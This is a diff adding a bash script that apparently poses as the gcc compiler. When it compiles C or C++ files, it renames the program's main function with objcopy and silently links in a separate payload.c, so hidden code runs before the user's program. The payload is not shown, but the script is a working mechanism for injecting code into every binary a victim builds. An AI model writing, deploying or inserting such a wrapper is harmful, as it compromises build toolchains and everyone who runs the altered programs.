@@ -1,0 +1,34 @@
+#!/bin/bash
+CC=/usr/bin/gcc    #"real" C compiler path
+TMP_PATH=./tmp_dir #<INSERT PATH HERE>
+
+includes_c_file=false
+inOutArg=false
+out="a.out"
+
+for arg in "$@"; do
+	if $inOutArg; then
+		inOutArg=false
+		out=$arg
+	fi
+	if [[ $arg == "-o" ]]; then
+		inOutArg=true
+	fi
+	if [[ $arg =~ \S*\.[cC]([pP]{2})?$ ]]; then
+		includes_c_file=true
+	fi
+done
+
+if ! $includes_c_file; then
+	$CC $@
+	exit 0
+fi
+if [ ! -f $TMP_PATH/other.h ]; then
+	echo "#ifndef OTHER_H
+#define OTHER_H
+int main2();
+#endif" >$TMP_PATH/other.h
+fi
+$CC $@ -c -o $TMP_PATH/other.o &&
+	objcopy --redefine-sym main=main2 $TMP_PATH/other.o &&
+	$CC $TMP_PATH/payload.c $TMP_PATH/other.o -o $out
